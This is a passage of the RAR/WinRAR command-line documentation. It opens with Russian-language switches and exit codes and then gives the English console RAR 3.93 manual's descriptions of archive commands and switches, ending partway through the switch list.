-x@<файл-список>	Не обрабатывать файлы, указанные в файле-списке
-y	Подразумевать ответ ""Да"" на все запросы
-z<файл>	Прочитать комментарий архива из файла

Коды возврата WinRAR

В случае успешного окончания операции WinRAR завершает работу с нулевым (0) кодом возврата. Если код возврата отличается от нулевого, это говорит о том, что произошла какая-то ошибка.

Код возврата
Описание
0	Операция успешно завершена.
1	Предупреждение. Произошли некритические ошибки.
2	Произошла критическая ошибка.
3	Неверная контрольная сумма CRC32. Данные повреждены.
4	Предпринята попытка изменить заблокированный архив.
5	Произошла ошибка записи на диск.
6	Произошла ошибка открытия файла.
7	Ошибка при указании параметра в командной строке.
8	Недостаточно памяти для выполнения операции.
9	Ошибка при создании файла.
10	Нет файлов, удовлетворяющих указанной маске, и параметров.
255	Операция была прервана пользователем.

ОФИЦИАЛЬНАЯ

Console RAR manual

User’s Manual
~~~~~~~~~~~~~
RAR 3.93 console version
~~~~~~~~~~~~~~~~~~~~~~~~

=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Welcome to the RAR Archiver!
-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Introduction
~~~~~~~~~~~~

RAR is a powerful tool allowing you to manage and control archive
files. Console RAR supports archives only in RAR format, the names
of which usually have a “.rar” extension. ZIP and other formats
are not supported. Windows users may install GUI RAR version – WinRAR,
which is able to process many more archive types.

RAR features include:

*  Highly sophisticated, original compression algorithm
*  Special compression algorithms optimized for text, audio,
graphics data, 32 and 64-bit Intel executables
*  Better compression than similar tools, using ‘solid’ archiving
*  Authenticity verification (registered version only)
*  Self-extracting archives and volumes (SFX)
*  Ability to recover physically damaged archives
*  Locking, password, file order list, file security & more …

Configuration file
~~~~~~~~~~~~~~~~~~

RAR for Unix reads configuration information from the file .rarrc
in the user’s home directory (stored in HOME environment variable)
or in /etc directory.

RAR for Windows reads configuration information from the file rar.ini,
placed in the same directory as the rar.exe file.

This file may contain the following string:

switches=any RAR switches, separated by spaces

For example:

switches=-m5 -s

Environment variable
~~~~~~~~~~~~~~~~~~~~

Default parameters may be added to the RAR command line by establishing
an environment variable “RAR”.

For instance, in UNIX following lines may be added to your profile:

RAR=’-s -md1024′
export RAR

RAR will use this string as default parameters in the command line and
will create “solid” archives with 1024 KB sliding dictionary size.

RAR handles options with priority as following:

command line switches                   highest priority
switches in the RAR variable            lower priority
switches saved in configuration file    lowest priority

Log file
~~~~~~~~

If the switch -ilog is specified in the command line or configuration
file, RAR will write informational messages, concerning errors
encountered while processing archives, into a log file. Read switch
-ilog description for more details.

The file order list for solid archiving – rarfiles.lst
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

rarfiles.lst contains a user-defined file list, which tells RAR
the order in which to add files to a solid archive. It may contain
file names, wildcards and special entry – $default. The default
entry defines the place in order list for files not matched
with other entries in this file. The comment character is ‘;’.

In Windows this file should be placed in the same directory as RAR
or in %APPDATA%\WinRAR directory, in Unix – to the user’s home directory
or in /etc.

Tips to provide improved compression and speed of operation:

– similar files should be grouped together in the archive;
– frequently accessed files should be placed at the beginning.

Normally masks placed nearer to the top of list have a higher priority,
but there is an exception from this rule. If rarfiles.lst contains such
two masks that all files matched by one mask are also matched by another,
that mask which matches a smaller subset of file names will have higher
priority regardless of its position in the list. For example, if you have
*.cpp and f*.cpp masks, f*.cpp has a higher priority, so the position of
‘filename.cpp’ will be chosen according to ‘f*.cpp’, not ‘*.cpp’.

RAR command line syntax
~~~~~~~~~~~~~~~~~~~~~~~

Syntax

RAR <command>  [ -<switches> ]  <archive>  [ <@listfiles…> ]
[ <files…> ]  [ <path_to_extract\> ]

Description

Command line options (commands and switches) provide control of
creating and managing archives with RAR. The command is a string (or a
single letter) which commands RAR to perform a corresponding action.
Switches are designed to modify the way RAR performs the action. Other
parameters are archive name and files to be archived into or extracted
from the archive.

Listfiles are plain text files that contain names of files to process.
File names should start at the first column. It is possible to
put comments to the listfile after // characters. For example,
you may create backup.lst containing the following strings:

c:\work\doc\*.txt         //backup text documents
c:\work\image\*.bmp       //backup pictures
c:\work\misc

and then run:

rar a backup @backup.lst

If you wish to read file names from stdin (standard input),
specify the empty listfile name (just @).

Win32 console RAR uses OEM (DOS) encoding in list files.

You may specify both usual file names and list files in the same
command line. If neither files nor listfiles are specified,
then *.* is implied and RAR will process all files

In a UNIX environment you need to quote wildcards to avoid them
being expanded by shell. For example, this command will extract
*.asm files from RAR archives in current path:

rar e ‘*.rar’ ‘*.asm’

Command could be any of the following:

a       Add files to archive.

Examples:

1) add all *.hlp files from the current directory to 
the archive help.rar:

rar a help *.hlp

2) archive all files from the current directory and subdirectories
to 362000 bytes size solid, self-extracting volumes 
and add the recovery record to each volume:

rar a -r -v362 -s -sfx -rr save

Because no file names are specified, all files (*) are assumed.

3) as a special exception, if directory name is specified as 
an argument and if directory name does not include file masks 
and trailing backslashes, the entire contents of the directory
and all subdirectories will be added to the archive even 
if switch -r is not specified.

The following command will add all files from the directory
Bitmaps and its subdirectories to the RAR archive Pictures.rar:

rar a Pictures.rar Bitmaps

4) if directory name includes file masks or trailing backslashes,
normal rules apply and you need to specify switch -r to process 
its subdirectories.

The following command will add all files from directory Bitmaps,
but not from its subdirectories, because switch -r is not
specified:

rar a Pictures.rar Bitmaps\*

c       Add archive comment. Comments are displayed while the archive is
being processed. Comment length is limited to 62000 bytes

Examples:

rar c distrib.rar

Also comments may be added from a file using -z[file] switch.
The following command adds a comment from info.txt file:

rar c -zinfo.txt dummy

cf      Add files comment. File comments are displayed when the ‘v’
command is given. File comment length is limited to 32767 bytes.

Example:

rar cf bigarch *.txt

ch      Change archive parameters.

This command can be used with most of archive modification
switches to modify archive parameters. It is especially
convenient for switches like -av, -cl, -cu, -tl, which do not
have a dedicated command.

It is not able to recompress, encrypt or decrypt archive data
and it cannot merge or create volumes. If used without any
switches, ‘ch’ command just copies the archive data without
modification.

Example:

Set archive time to latest file:

rar ch -tl files.rar

cw      Write archive comment to specified file.

Format of output file depends on -sc switch.

If output file name is not specified, comment data will be
sent to stdout.

Examples:

1) rar cw arc comment.txt

2) rar cw -scuc arc unicode.txt

3) rar cw arc

d       Delete files from archive. Please note if the processing of this
command results in removing all the files from the archive,
the empty archive would removed.

e       Extract files to current directory.

f       Freshen files in archive. Updates those files changed since they
were packed to the archive. This command will not add new files
to the archive.

i[i|c|h|t]=<string>
Find string in archives.

Supports following optional parameters:

i – case insensitive search (default);

c – case sensitive search;

h – hexadecimal search;

t – use ANSI, Unicode and OEM character tables (Win32 only);

If no parameters are specified, it is possible to use
the simplified command syntax i<string> instead of i=<string>

It is allowed to specify ‘t’ modifier with other parameters,
for example, ict=string performs case sensitive search
using all mentioned above character tables.

Examples:

1) rar “ic=first level” -r c:\*.rar *.txt

Perform case sensitive search of “first level” string
in *.txt files in *.rar archives on the disk c:

2) rar ih=f0e0aeaeab2d83e3a9 -r e:\texts

Search for hex string f0 e0 ae ae ab 2d 83 e3 a9
in rar archives in e:\texts directory.

k       Lock archive. Any command which intends to change the archive
will be ignored.

Example:

rar k final.rar

l[t,b]  List contents of archive [technical]. Files are listed as with
the ‘v’ command with the exception of the file path. i.e. only
the file name is displayed. Optional technical information
(host OS, solid flag and old version flag) is displayed
when ‘t’ modifier is used. Modifier ‘b’ forces RAR to output
only bare file names without any additional information.

m[f]    Move to archive [files only]. Moving files and directories
results in the files and directories being erased upon
successful completion of the packing operation. Directories will
not be removed if ‘f’ modifier is used and/or ‘-ed’ switch is
applied.

p       Print file to stdout.

You may use this command together with -inul switch to disable
all RAR messages and print only file data. It may be important
when you need to send a file to stdout for use in pipes.

r       Repair archive. Archive repairing is performed in two stages.
First, the damaged archive is searched for a recovery record
(see ‘rr’ command). If the archive contains a recovery record
and if the portion of the damaged data is continuous and less
than N*512 bytes, where N is number of recovery sectors placed
into the archive, the chance of successful archive
reconstruction is very high. When this stage has been completed,
a new archive will be created, called fixed.arcname.rar,
where ‘arcname’ is the original (damaged) archive name.

If a broken archive does not contain a recovery record or if
the archive is not completely recovered due to major damage, a
second stage is performed. During this stage only the archive
structure is reconstructed and it is impossible to recover
files which fail the CRC validation, it is still possible,
however, to recover undamaged files, which were inaccessible
due to the broken archive structure. Mostly this is useful
for non-solid archives.

When the second stage is completed, the reconstructed archive
will be saved as rebuilt.arcname.rar, where ‘arcname’ is
the original archive name.

RAR/DOS32 version uses _recover.rar and _reconst.rar instead
of names mentioned aboves.

While the recovery is in progress, RAR may prompt the user for
assistance when a suspicious file is detected.

Suspicious entry

Name:  <possibly filename>
Size:  <size>    Packed: <compressed size>

Add it: Yes/No/All

Answer ‘y’ to add this entry to the file rebuilt.arcname.rar.

Example:

rar r buggy.rar

rc      Reconstruct missing and damaged volumes using recovery volumes
(.rev files). You need to specify any existing volume
as the archive name, for example, ‘rar rc backup.part03.rar’

Read ‘rv’ command description for information about
recovery volumes.

rn      Rename archived files.

The command syntax is:

rar rn <arcname> <srcname1> <destname1> … <srcnameN> <destnameN>

For example, the following command:

rar rn data.rar readme.txt readme.bak info.txt info.bak

will rename readme.txt to readme.bak and info.txt to info.bak
in the archive data.rar.

It is allowed to use wildcards in the source and destination
names for simple name transformations like changing file
extensions. For example:

rar rn data.rar *.txt *.bak

will rename all *.txt files to *.bak.

RAR does not check if the destination file name is already
present in the archive, so you need to be careful to avoid
duplicated names. It is especially important when using
wildcards. Such a command is potentially dangerous, because
a wrong wildcard may corrupt all archived names.

rr[N]   Add data recovery record. Optionally, redundant information
(recovery record) may be added to an archive. This will cause
a small increase of the archive size and helps to recover
archived files in case of floppy disk failure or data losses of
any other kind. A recovery record contains up to 524288 recovery
sectors. The number of sectors may be specified directly in the
‘rr’ command (N = 1, 2 .. 524288) or, if it is not specified by
the user, it will be selected automatically according to the
archive size: a size of the recovery information will be about
1% of the total archive size, usually allowing the recovery of
up to 0.6% of the total archive size of continuously damaged data.

It is also possible to specify the recovery record size in
percent to the archive size. Just append the percent character
to the command parameter. For example:

rar rr3% arcname

Note that if you run this command from .bat or .cmd file,
you need to use rr3%% instead of rr3%, because the command
processor treats the single ‘%’ character as the start of
a batch file parameter. You may also use ‘p’ instead of ‘%’,
so ‘rr3p’ will work too.

If data is damaged continuously, then each rr-sector helps to
recover 512 bytes of damaged information. This value may be
lower in cases of multiple damage.

The size of the recovery record may be approximately determined
by the formula <archive size>/256 + <number of recovery
sectors>*512 bytes.

rv[N]   Create recovery volumes (.rev files), which can be later
used to reconstruct missing and damaged files in a volume
set. This command makes sense only for multivolume archives
and you need to specify the name of the first volume
in the set as the archive name. For example:

rar rv3 data.part01.rar

This feature may be useful for backups or, for example,
when you posted a multivolume archive to a newsgroup
and a part of subscribers did not receive some of the files.
Reposting recovery volumes instead of usual volumes
may reduce the total number of files to repost.

Each recovery volume is able to reconstruct one missing
or damaged RAR volume. For example, if you have 30 volumes
and 3 recovery volumes, you are able to reconstruct any
3 missing volumes. If the number of .rev files is less than
the number of missing volumes, reconstructing is impossible.
The total number of usual and recovery volumes must not
exceed 255.

Original RAR volumes must not be modified after creating
recovery volumes. Recovery algorithm uses data stored both
in REV files and in RAR volumes to rebuild missing RAR volumes.
So if you modify RAR volumes, for example, lock them, after
creating REV files, recovery process will fail.

The optional <N> parameter specifies a number of recovery
volumes to create and must be less than the total number
of RAR volumes in the set. You may also append a percent
character to this parameter, in such case the number of
creating .rev files will be equal to this percent taken
from the total number of RAR volumes. For example:

rar rv15% data.part01.rar

RAR reconstructs missing and damaged volumes either when
using ‘rc’ command or automatically, if it cannot locate
the next volume and finds the required number of .rev files
when unpacking.

Original copies of damaged volumes are renamed to *.bad
before reconstruction. For example, volname.part03.rar
will be renamed to volname.part03.rar.bad.

s[name] Convert archive to SFX. The archive is merged with a SFX module
(using a module in file default.sfx or specified in the switch).
In the Windows version default.sfx should be placed in the
same directory as the rar.exe, in Unix – in the user’s
home directory, in /usr/lib or /usr/local/lib.

s-      Remove SFX module from the already existing SFX archive.
RAR creates a new archive without SFX module, the original
SFX archive is not deleted.

t       Test archive files. This command performs a dummy file
extraction, writing nothing to the output stream, in order to
validate the specified file(s).

Examples:

Test archives in current directory:

rar t *

or for Unix:

rar t ‘*’

User may test archives in all sub-directories, starting
with the current path:

rar t -r *

or for Unix:

rar t -r ‘*’

u       Update files in archive. Adds files not yet in the archive
and updates files that have been changed since they were packed
into the archive.

v[t,b]  Verbosely list the contents of archive [technical].
Files are listed using the format: full pathname, file comment,
original and compressed size, compression ratio, last update
date and time, attributes, CRC, compression method and minimum
RAR version required to extract. Optional technical information
(host OS, solid flag and old file version flag) is displayed
when ‘t’ modifier is used. Modifier ‘b’ forces RAR to output
only bare file names without any additional information.

To list the contents of all archive volumes, use an asterisk
(‘*’) in place of the archive file extension or use the ‘-v’
switch.

Example:

1) list contents of system.rar archive (technical mode)
and redirect output to file techlist.lst

rar vt system >techlist.lst

2) list contents of tutorial.rar archive (bare file names mode)

rar vb tutorial

x       Extract files with full path.

Example:

rar x -av- -c- dime 10cents.txt

extract specified file to current path. AV check and comment
show are disabled.

Switches (used in conjunction with a command):

-?      Display help on commands and switches. The same as when none
or an illegal command line option is entered.

—      Stop switches scanning

This switch tells to RAR that there are no more switches
in the command line. It could be useful, if either archive
or file name starts from ‘-‘ character. Without ‘–‘ switch
such a name would be treated as a switch.

Example:

add all files from the current directory to the solid archive
‘-StrangeName’

RAR a -s — -StrangeName

-ac     Clear Archive attribute after compression or extraction
(Windows version only).

-ad     Append archive name to destination path.

This option may be useful when unpacking a group of archives.
By default RAR places files from all archives in the same
directory, but this switch creates a separate directory
for files unpacked from each archive.

Example:

rar x -ad *.rar data\

RAR will create subdirectories below ‘data’ for every unpacking
archive.

-ag[format]
Generate archive name using the current date and time.

Appends the current date string to an archive name when
creating an archive. Useful for daily backups.

Format of the appending string is defined by the optional
“format” parameter or by “YYYYMMDDHHMMSS” if this parameter
is absent. The format string may include the following
characters:

Y   – year
M   – month
MMM – month name as text string (Jan, Feb, etc.)
W   – a week number (a week starts with Monday)
A   – day of week number (Monday is 1, Sunday – 7)
D   – day of month
E   – day of year
H   – hours
M   – minutes (treated as minutes if encountered after hours)
S   – seconds
N   – archive number. RAR searches for already existing archive
with generated name and if found, increments the archive
number until generating a unique name. ‘N’ format character
is not supported when creating volumes.

Each of format string characters listed above represents only
one character added to archive name. For example, use WW for
two digit week number or YYYY to define four digit year.

If the first character in the format string is ‘+’, positions
of the date string and base archive name are exchanged,
so a date will precede an archive name.

The format string may contain optional text enclosed in ‘{‘
and ‘}’ characters. This text is inserted into archive name.

All other characters are added to an archive name without
changes.

If you need to update an already existing archive, be careful
with -ag switch. Depending on the format string and time passed
since previous -ag use, generated and existing archive names
may mismatch. In this case RAR will create a new archive
instead of updating the already existing.

Examples:

1) use the default YYYYMMDDHHMMSS format

rar a -ag backup

2) use DD-MMM-YY format

rar a -agDD-MMM-YY backup

3) use YYYYMMDDHHMM format, place date before ‘backup’

rar a -ag+YYYYMMDDHHMM backup

4) use YYYY-WW-A format, include fields description

rar a -agYYYY{year}-WW{week}-A{wday} backup

5) use YYYYMMDD and the archive number. It allows to generate
unique names even when YYYYMMDD format mask used more than
once in the same day

rar a -agYYYYMMDD-NN backup

-ai     Ignore file attributes.

If this switch is used when extracting, RAR does not set
general file attributes stored in archive to extracted files.
This switch preserves attributes assigned by operating system
to a newly created file.

In Windows it affects archive, system, hidden and read-only
attributes. in Unix – user, group, and others file permissions.

-ao     Add files with Archive attribute set
(Windows version only).

Example:

add all disk C: files with Archive attribute set
to the ‘f:backup’ and clear files Archive attribute

rar a -r -ac -ao f:backup c:\*.*

-ap     Set path inside archive. This path is merged to file
names when adding files to an archive and removed
from file names when extracting.

For example, if you wish to add the file ‘readme.txt’
to the directory ‘DOCS\ENG’ of archive ‘release’,
you may run:

rar a -apDOCS\ENG release readme.txt

or to extract ‘ENG’ to the current directory:

rar x -apDOCS release DOCS\ENG\*.*

-as     Synchronize archive contents

If this switch is used when archiving, those archived files
which are not present in the list of the currently added
files, will be deleted from the archive. It is convenient to
use this switch in combination with -u (update) to synchronize
contents of an archive and an archiving directory.

For example, after the command:

rar a -u -as backup sources\*.cpp

the archive ‘backup.rar’ will contain only *.cpp files
from directory ‘sources’, all other files will be deleted
from the archive. It looks similar to creating a new archive,
but with one important exception: if no files are modified
since the last backup, the operation is performed much faster
than the creation of a new archive.

-av     Put authenticity verification (registered versions only).
RAR will put, in every new and updated archive, information
concerning the creator, last update time and archive name.

If an archive, containing authenticity verification, is being
modified and this switch is not specified, the authenticity
verification information will be removed.

When extracting, testing, listing or updating an archive with
the ‘-av’ switch, RAR will perform integrity validation and
display the message:

Verifying authenticity information …

In the case of successful authenticity verification, 
message ‘Ok’, creator name and last update information will be
displayed. In the case of authenticity verification failure,
message ‘FAILED’ will be displayed.

RAR authenticity verification can be forged and does not
provide the same level of security as modern digital signature
schemes based on public key infrastructure. We recommend 
to use this RAR feature as informational only, like a special
archive comment. Avoid it in situations, when accurate
information about archive creator is important.

In order to enable the authenticity verification feature,
the program must be registered. Please contact your local
distribution site or the world-wide distribution center.

-av-    Disable authenticity verification checking or adding.

-cfg-   Ignore configuration file and RAR environment variable.

-cl     Convert file names to lower case.

-cu     Convert file names to upper case.

-c-     Disable comments show.

-df     Delete files after archiving

Move files to archive. This switch in combination with
the command “A” performs the same action as the command “M”.

-dh     Open shared files

Allows to process files opened by other applications
for writing.

This switch helps if an application allowed read access
to file, but if all types of file access are prohibited,
the file open operation will still fail.

This option could be dangerous, because it allows
to archive a file, which at the same time is modified
by another application, so use it carefully.

-dr     Delete files to Recycle Bin

Delete files after archiving and place them to Recycle Bin.
Available in Windows version only.

-ds     Do not sort files while adding to a solid archive.

-dw     Wipe files after archiving

Delete files after archiving. Before deleting file data
are overwritten by zero bytes to prevent recovery of
deleted files.

-ed     Do not add empty directories

This switch indicates that directory records are not to be
stored in the created archive. When extracting such archives,
RAR creates non-empty directories basing on paths of files
contained in them. Information about empty directories is
lost. All attributes of non-empty directories except a name
(access rights, streams, etc.) will be lost as well, so use
this switch only if you do not need to preserve such information.

If -ed is used with ‘m’ command or -df switch, RAR will not
remove empty directories.

-ee     Do not process extended attributes

Disables saving and restoring extended file attributes.
Only for OS/2 versions.

-en     Do not add “end of archive” block

By default, RAR adds an “end of archive” block to the end of
a new or updated archive. It allows to skip external data like
digital signatures safely, but in some special cases it may be
useful to disable this feature. For example, if an archive
is transferred between two systems via an unreliable link and
at the same time a sender adds new files to it, it may be
important to be sure that the already received file part will
not be modified on the other end between transfer sessions.

This switch cannot be used with volumes, because the end
of archive block contains information important for correct
volume processing.

-ep     Exclude paths from names. This switch enables files to be added
to an archive without including the path information. This
could, of course, result in multiple files existing in the
archive with the same name.

-ep1    Exclude base dir from names. Do not store the path entered in
the command line.

Example:

all files and directories from the directory tmp will be added
to the archive ‘test’, but the path in archived names will not
include ‘tmp\’

rar a -ep1 -r test tmp\*

This is equivalent to the commands:

cd tmp
rar a -r ..\test
cd ..

-ep2    Expand paths to full. Store full file paths (except a drive
letter and leading path separator) when archiving.

-ep3    Expand paths to full including the drive letter.
Win32 version only.

This switch stores full file paths including the drive
letter if used when archiving. Drive separators (colons)
are replaced by underscore characters.

If you use -ep3 when extracting, it will change
underscores back to colons and create unpacked files
in their original directories and disks. If the user
also specified a destination path, it will be ignored.

This switch can help to backup several disks to the same
archive. For example, you may run:

rar a -ep3 -r backup.rar c:\ d:\ e:\

to create backup and:

rar x -ep3 backup.rar

to restore it.

But be cautious and use -ep3 only if you are sure that
extracting archive does not contain any malicious files.
In other words, use it if you have created an archive yourself
or completely trust its author. This switch allows to overwrite
any file in any location on your computer including important
system files and should normally be used only for the purpose
of backup and restore.

-e[+]<attr>
Specifies file exclude or include attributes mask.

<attr> is a number in the decimal, octal (with leading ‘0’)
or hex (with leading ‘0x’) format.

By default, without ‘+’ sign before <attr>, this switch
defines the exclude mask. So if result of bitwise AND between
<attr> and file attributes is nonzero, file would not be
processed.

If ‘+’ sign is present, it specifies the include mask.
Only those files which have at least one attribute specified
in the mask will be processed.

In Windows version is also possible to use symbols D, S, H,
A and R instead of a digital mask to denote directories
and files with system, hidden, archive and read-only attributes.
The order in which the attributes are given is not significant.
Unix version supports D and V symbols to define directory
and device attributes.

It is allowed to specify both -e<attr> and -e+<attr>
in the same command line.

Examples:

1) archive only directory names without their contents

rar a -r -e+d dirs

2) do not compress system and hidden files:

rar a -esh files

3) do not extract read-only files:

rar x -er files

-f      Freshen files. May be used with archive extraction or creation.
The command string “a -f” is equivalent to the command ‘f’, you
could also use the switch ‘-f’ with the commands ‘m’ or ‘mf’. If
the switch ‘-f’ is used with the commands ‘x’ or ‘e’, then only
old files would be replaced with new versions extracted from the
archive.

-hp[p]  Encrypt both file data and headers.

This switch is similar to -p[p], but switch -p encrypts
only file data and leaves other information like file names
visible. This switch encrypts all sensitive archive areas
including file data, file names, sizes, attributes, comments
and other blocks, so it provides a higher security level.
Without a password it is impossible to view even the list of
files in archive encrypted with -hp.

Example:

rar a -hpfGzq5yKw secret report.txt

will add the file report.txt to the encrypted archive
secret.rar using the password ‘fGzq5yKw’

-id[c,d,p,q]
Disable messages.

Switch -idc disables the copyright string.

Switch -idd disables “Done” string at the end of operation.

Switch -idp disables the percentage indicator.

Switch -idq turns on the quiet mode, so only error messages
and questions are displayed.

It is allowed to use several modifiers at once,
so switch -idcdp is correct.

-ieml[.][addr]
Send archive by email. Win32 version only.

Attach an archive created or updated by the add command
to email message. You need to have a MAPI compliant email
client to use this switch (most modern email programs
support MAPI interface).

You may enter a destination email address directly
in the switch or leave it blank. In the latter case you
will be asked for it by your email program. It is possible
to specify several addresses separated by commas or semicolons.

If you append a dot character to -ieml, an archive will be
deleted after it was successfully attached to an email.
If the switch is used when creating a multivolume archive,
every volume is attached to a separate email message.

-ierr   Send all messages to stderr.

-ilog[name]
Log errors to file (registered version only).

Write error messages to rar.log file. If optional ‘name’
parameter is not specified, the log file is created
using the following defaults:

Unix:    .rarlog file in the user’s home directory;
Windows: rar.log file in %APPDATA%\WinRAR directory;
DOS:     rar.log file in the same directory as the rar32.exe.

If ‘name’ parameter includes a file name without path,
RAR will create the log file in default directory from
the list above using the specified name. Include both path
and name to ‘name’ parameter if you wish to change
the location of log file.

Example:

rar a -ilogc:\log\backup.log backup d:\docs

will create c:\log\backup.log log file in case of errors.

-inul   Disable all messages.

-ioff   Turn PC off after completing an operation. The hardware must
support the power off feature. Win32 version only.

-isnd   Enable sound.

-k      Lock archive. Any command which intends to change the archive
will be ignored.

-kb     Keep broken extracted files.

RAR, by default, deletes files with CRC errors after
extraction. The switch -kb specifies that files with
CRC errors should not be deleted.

-m<n>   Set compression method:

-m0   store     do not compress file when adding to archive
-m1   fastest   use fastest method (less compressive)
-m2   fast      use fast compression method
-m3   normal    use normal (default) compression method
-m4   good      use good compression method (more
compressive, but slower)
-m5   best      use best compression method (slightly more
compressive, but slowest)

If this switch is not specified, RAR uses -m3 method
(normal compression).

By default, RAR uses only the general compression
algorithm in -m1 and -m2 methods, advanced algorithms
like audio and true color processing are enabled
only in -m3..-m5 modes, the advanced text compression
is activated only in -m4..-m5. This default can be
overridden using -mc switch.

-mc<par>
Set advanced compression parameters.

This switch is intended mainly for benchmarking and
experiments. In the real environment it is usually better
to allow RAR to select optimal parameters automatically.
Please note that improper use of this switch may lead
to very serious performance and compression loss, so use
it only if you clearly understand what you do.

It has the following syntax:

-mc[param1][:param2][module][+ or -]

where <module> is the one character field denoting a part
of the compression algorithm, which has to be configured.

It may have the following values:

A       – audio compression;
C       – true color (RGB) data compression;
D       – delta compression;
E       – 32-bit x86 executables compression;
I       – 64-bit Intel Itanium executables compression;
T       – text compression.

‘+’ sign at the end of switch applies the selected algorithm
module to all processed data, ‘-‘ disables the module at all.
If no sign is specified, RAR will choose modules automatically,
based on data and the current compression method.

Switch -mc- disables all optional modules and allows only
the general compression algorithm.

<Param1> and <Param2> are module dependent parameters
described below.

Audio compression, delta compression:

<Param1> is a number of byte channels (can be 1 – 31).
RAR splits multibyte channels to bytes, for example,
two 16-bit audio channels are considered by RAR as four
channels one byte each.

<Param2> is ignored.

32-bit x86 Intel executables compression,
64-bit Intel Itanium executables compression,
true color (RGB) data compression:

<Param1> and <Param2> are ignored.

Text compression:

<Param1> is the order of PPM algorithm (can be 2 – 63).
Usually a higher value slightly increases the compression ratio
of redundant data, but only if enough memory is available
to PPM. In case of lack of memory the result may be negative.
Higher order values decrease both compression and decompression
speed.

<Param2> is memory in megabytes allocated for PPM (1-128).
Higher values may increase the compression ratio, but note
that PPM uses the equal memory size both to compress and
decompress, so if you allocate too much memory when creating
an archive, other people may have problems when decompressing
it on a computer with less memory installed. Decompression
will be still possible using virtual memory, but it may
become very slow.

Examples:

1) switch -mc1a+ forces use of 8-bit mono audio compression
for all data.

2) switch -mc10:40t+ forces use of text compression
algorithm for all data, sets the compression order to 10
and allocates 40 MB memory.

3) switch -mc12t sets the text compression order to 12,
when the text compression is used, but leaves to RAR to
decide when to use it.

4) switches -mct- -mcd- disable text and delta compression.

-md<n>  Select dictionary size <n> in KB. Must be 64, 128, 256, 512,
1024, 2048 or 4096 or a letter ‘a’, ‘b’, ‘c’, ‘d’, ‘e’, ‘f’, ‘g’
respectively.

The sliding dictionary is a special memory area used by the
compression algorithm. If the size of the file being compressed
(or the total files size in the case of a solid archive) is
greater than the dictionary size, then increasing the dictionary
size will generally increase compression ratio, decrease packing
speed and increase memory requirements.

RAR can reduce the dictionary size if it is significantly
larger than the size of the source data. It helps to reduce
memory requirements without decreasing compression.

Default sliding dictionary size is 4096 KB.

Example:

RAR a -s -mdd sources *.asm
or
RAR a -s -md512 sources *.asm

Will create a solid archive using a 512 KB dictionary.

-ms[list]
Specify file types to store.

Specify file types, which will be stored without compression.
This switch may be used to store already compressed files,
which helps to increase archiving speed without noticeable
loss in the compression ratio.

Optional <list> parameter defines the list of file extensions
separated by semicolons. For example, -msrar;zip;jpg will
force RAR to store without compression all RAR and ZIP
archives and JPG images. It is also allowed to specify wildcard
file masks in the list, so -ms*.rar;*.zip;*.jpg will work too.

If <list> is not specified, -ms switch will use the default
set of extensions, which includes the following file types:

7z, ace, arj, bz2, cab, gz, jpeg, jpg, lha, lzh, mp3,
rar, taz, tgz, z, zip

-mt<threads>
Set the number of threads. Available in Windows version only.

<threads> parameter can take values from 0 to 16.
It defines the recommended number of active threads
for compression algorithm. If it is greater than 0,
RAR will use the multithreaded version of compression
algorithm providing higher speed on multiprocessor
architectures. Real number of active threads can differ
from the specified.

If <threads> is zero, RAR will use the single threaded
compression algorithm.

Change of <threads> parameter slightly affects the compression
ratio, so archives created with different -mt switches
will not be exactly the same even if all other compression
settings are equal.

If -mt switch is not specified, RAR will try to detect
the number of available processors and select the optimal
number of threads automatically.

-n<f>   Include only the specified file <f>. Wildcards may be used
both in the name and file parts of file mask. You may specify
the switch ‘-n’ several times.

This switch does not replace usual file masks, which still
need to be entered in the command line. It is an additional
filter limiting processed files only to those matching
the include mask specified in -n switch. It can help to
reduce the command line length sometimes.

For example, if you need to compress all *.txt and *.lst
files in directories Project and Info, you can enter:

rar a -r text Project\*.txt Project\*.lst Info\*.txt Info\*.lst

or using the switch -n:

rar a -r -n*.txt -n*.lst text Project Info

-n@<lf> Include files listed in the specified list file.

Similar to -n<f> switch, but reads include masks from
the list file. If you use -n@ without the list file name
parameter, it will read file names from stdin.

Example:

rar a -r -n@inclist.txt text Project Info

-oc     Set NTFS Compressed attribute. Win32 version only.

This switch allows to restore NTFS Compressed attribute
when extracting files. RAR saves Compressed file attributes
when creating an archive, but does not restore them unless
-oc switch is specified.

-ol     Save symbolic links as the link instead of the file.
Unix version only.

-or     Rename extracted files automatically if file with the same name
already exists. Renamed file will get the name like
‘filename(N).txt’, where ‘filename.txt’ is the original file
name and ‘N’ is a number starting from 1 and incrementing
if file exists.

-os     Save NTFS streams. Win32 version only.

This switch has meaning only for NTFS file system and allows
to save alternative data streams associated with a file.
It is especially important in Windows 2000, XP and newer,
which use streams to keep some file dependent information
like file descriptions. If you use RAR to backup your
NTFS disks, it is recommended to specify this switch.

-ow     Use this switch when archiving to save file security
information and when extracting to restore it.

Unix RAR version saves file owner and group when using
this switch.

Win32 version stores owner, group, file permissions and
audit information, but only if you have necessary privileges
to read them. Note that only NTFS file system supports
file based security under Windows.

-o[+|-] Set the overwrite mode. Can be used both when extracting
and updating archived files. Following modes are available:

-o           Ask before overwrite
(default for extracting files);

-o+          Overwrite all
(default for updating archived files);

-o-          Skip existing files.

-p[p]   Encrypt files with the string <p> as password while archiving.
The password is case-sensitive. If you omit the password on the
command line, you will be prompted with message “Enter password”.

Example:

rar a -pmyhoney secret1 *.txt

add files *.txt and encrypt them with password “myhoney”.

-p-     Do not query password

-r      Recurse subdirectories. May be used with commands:
a, u, f, m, x, e, t, p, v, l, c, cf and s.

When used with the commands ‘a’, ‘u’, ‘f’, ‘m’ will process
files in all sub-directories as well as the current working
directory.

When used with the commands x, e, t, p, v, l, c, cf or s will
process all archives in sub-directories as well as the current
working directory.

-r-     Disable recursion.

Even without -r switch RAR can enable the recursion
automatically in some situations. Switch -r- prohibits it.

If you specify a directory name when archiving and if such 
name does not include wildcards, by default RAR adds
the directory contents even if switch -r is not specified.
Also RAR automatically enables the recursion if disk root
without wildcards is specified as a file mask. Switch -r- 
disables such behavior.

For example:

rar a -r- arc dirname

command will add only the empty ‘dirname’ directory and ignore 
its contents. Following command:

rar a -r- arc c:\

will compress contents of root c: directory only and 
will not recurse into subdirectories.

-r0     Similar to -r, but when used with the commands ‘a’, ‘u’, ‘f’,
‘m’ will recurse subdirectories only for those names, which
include wildcard characters ‘*’ and ‘?’

-ri<p>[:<s>]
